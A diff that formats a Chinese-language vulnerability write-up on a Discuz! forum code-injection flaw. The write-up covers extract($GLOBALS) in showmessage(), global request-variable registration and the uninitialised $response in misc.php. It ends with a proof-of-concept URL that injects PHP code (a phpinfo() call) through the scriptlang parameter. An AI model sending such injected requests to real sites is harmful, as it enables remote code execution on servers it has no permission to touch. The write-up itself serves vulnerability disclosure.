@@ -29,6 +29,7 @@ ViewNums: 3445
 
 **一、漏洞来自showmessage函数：**
 
+```
 function showmessage($message, $url_forward = '', $extra = '', $forwardtype = 0) {
 extract($GLOBALS, EXTR_SKIP);//危险的用法，未初始化的变量可以直接带进函数，直接导致了问题产生
 global $hookscriptmessage, $extrahead, $discuz_uid, $discuz_action, $debuginfo, $seccode, $seccodestatus, $fid, $tid, $charset, $show_message, $inajax, $_DCACHE, $advlist;
@@ -92,17 +93,21 @@ unset($pre);
 
 ......
 }
+```
 
 **二、DZ的全局机制导致了未初始化的参数可以任意提交：**
 
+```
 foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
 foreach($$_request as $_key => $_value) {
 $_key{0} != '_' && $$_key = daddslashes($_value);
 }
 }
+```
 
 **三、misc.php正好有个可以自定义message的点，其实也是未初始化：**
 
+```
 elseif($action == 'imme_binding' && $discuz_uid) {
 
 if(isemail($id)) {
@@ -122,6 +127,7 @@ showmessage($response['result']);//$response没有初始化，可以自定义
 }
 
 }
+```
 
 **四、漏洞利用：**
 
@@ -136,5 +142,8 @@ showmessage函数里$vars = explode(':', $message);然后message可以自己控�
 poc：
 
 （应Saiy的要求，不发exp了！）注册一个用户登陆,然后提交
+```
+
 misc.php?action=imme_binding&response[result]=1:2&scriptlang[1][2]={${phpinfo()}}
 
+```
